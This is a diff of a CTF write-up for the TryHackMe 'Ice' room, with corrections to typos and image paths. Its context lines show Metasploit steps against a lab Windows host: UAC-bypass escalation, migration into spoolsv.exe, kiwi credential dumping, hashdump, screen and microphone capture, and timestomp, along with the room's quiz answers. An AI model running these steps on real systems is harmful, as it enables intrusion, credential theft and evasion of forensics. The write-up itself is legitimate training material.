@@ -2,11 +2,9 @@
 {"dg-publish":true,"permalink":"/write-ups/try-hack-me/ice/","tags":["CTF","write-up","windows"]}
 ---
 
-# Passive reconnaisance
-N/A
 
 ---
-# Active reconnaisance
+# Active reconnaissance
 ## Enum ports and services
 General scan to all ports
 ```shell
@@ -40,7 +38,7 @@ sudo nmap 10.10.211.3 -p 8000 -sCV
 > [!check]- What service did nmap identify as running on port 8000? (First word of this service)
 > Icecast
 
-# Vuln analisis
+# Vuln analysis
 ## Port 5357
 ```
 |_http-server-header: Microsoft-HTTPAPI/2.0
@@ -105,7 +103,7 @@ PORT     STATE SERVICE VERSION
 8000/tcp open  http    Icecast streaming media server
 |_http-title: Site doesn't have a title (text/html).
 ```
-![Pasted image 20240824193822.png|500](/img/user/Pasted%20image%2020240824193822.png)
+![Pasted image 20240824193822.png|500](/img/user/attachments/Pasted%20image%2020240824193822.png)
 > [!check]- What is the **Impact Score** for this vulnerability? Use [https://www.cvedetails.com](https://www.cvedetails.com) for this question and the next.
 > 6.4
 
@@ -142,7 +140,7 @@ Now we have a shell
 ```shell
 getuid
 ```
-![Pasted image 20240824220248.png|300](/img/user/Pasted%20image%2020240824220248.png)
+![Pasted image 20240824220248.png|300](/img/user/attachments/Pasted%20image%2020240824220248.png)
 > [!check]- What user was running that Icecast process? The commands used in this question and the next few are taken directly from the '[Metasploit](https://tryhackme.com/module/metasploit)' module.
 > Dark
 
@@ -150,7 +148,7 @@ Gets information about the remote system, such as OS
 ```shell
 sysinfo
 ```
-![Pasted image 20240824220618.png|500](/img/user/Pasted%20image%2020240824220618.png)
+![Pasted image 20240824220618.png|500](/img/user/attachments/Pasted%20image%2020240824220618.png)
 
 > [!check]- What build of Windows is the system?
 > 7601
@@ -161,13 +159,13 @@ sysinfo
 ```shell
 run post/multi/recon/local_exploit_suggester
 ```
-![Pasted image 20240824221707.png|500](/img/user/Pasted%20image%2020240824221707.png)
+![Pasted image 20240824221707.png|500](/img/user/attachments/Pasted%20image%2020240824221707.png)
 
 > [!check]- Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?
 > exploit/windows/local/bypassuac_eventvwr
 
 Check the number session
-![Pasted image 20240824231014.png|500](/img/user/Pasted%20image%2020240824231014.png)
+![Pasted image 20240824231014.png|500](/img/user/attachments/Pasted%20image%2020240824231014.png)
 Set session number `1` 
 ```shell
 set SESSION 1
@@ -188,12 +186,12 @@ Exec `run`
 ```shell
 getprivs
 ```
-![Pasted image 20240824232307.png|200](/img/user/Pasted%20image%2020240824232307.png)
+![Pasted image 20240824232307.png|200](/img/user/attachments/Pasted%20image%2020240824232307.png)
 # Looting
 ```shell
 ps
 ```
-![Pasted image 20240825101506.png](/img/user/Pasted%20image%2020240825101506.png)
+![Pasted image 20240825101506.png](/img/user/attachments/Pasted%20image%2020240825101506.png)
 
 > [!check]- The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?
 > spoolsv.exe
@@ -202,7 +200,7 @@ Migrate
 ```shell
 migrate -N spoolsv.exe
 ```
-![Pasted image 20240825103500.png|300](/img/user/Pasted%20image%2020240825103500.png)
+![Pasted image 20240825103500.png|300](/img/user/attachments/Pasted%20image%2020240825103500.png)
 
 > [!check]- Let's check what user we are now with the command `getuid`. What user is listed?
 > NT AUTHORITY\SYSTEM
@@ -211,12 +209,12 @@ migrate -N spoolsv.exe
 load kiwi
 help
 ```
-![Pasted image 20240825105633.png|300](/img/user/Pasted%20image%2020240825105633.png)
+![Pasted image 20240825105633.png|300](/img/user/attachments/Pasted%20image%2020240825105633.png)
 
 > [!check]- Which command allows up to retrieve all credentials?
 > creds_all
 
-![Pasted image 20240825110114.png](/img/user/Pasted%20image%2020240825110114.png)
+![Pasted image 20240825110114.png](/img/user/attachments/Pasted%20image%2020240825110114.png)
 
 > [!check]- Run this command now. What is Dark's password?
 > Password01!
@@ -225,21 +223,21 @@ help
 help
 ```
 
-![Pasted image 20240825124215.png|500](/img/user/Pasted%20image%2020240825124215.png)
+![Pasted image 20240825124215.png|500](/img/user/attachments/Pasted%20image%2020240825124215.png)
 > [!check]- What command allows us to dump all of the password hashes stored on the system?
 > hashdump
 
-![Pasted image 20240825124627.png|500](/img/user/Pasted%20image%2020240825124627.png)
+![Pasted image 20240825124627.png|500](/img/user/attachments/Pasted%20image%2020240825124627.png)
 
 > [!check]- While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?
 > screenshare
 
-![Pasted image 20240825124742.png](/img/user/Pasted%20image%2020240825124742.png)
+![Pasted image 20240825124742.png](/img/user/attachments/Pasted%20image%2020240825124742.png)
 
 > [!check]- How about if we wanted to record from a microphone attached to the system?
 > record_mic
 
-![Pasted image 20240825125050.png|300](/img/user/Pasted%20image%2020240825125050.png)
+![Pasted image 20240825125050.png|300](/img/user/attachments/Pasted%20image%2020240825125050.png)
 
 > [!check]- To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this?
 > timestomp
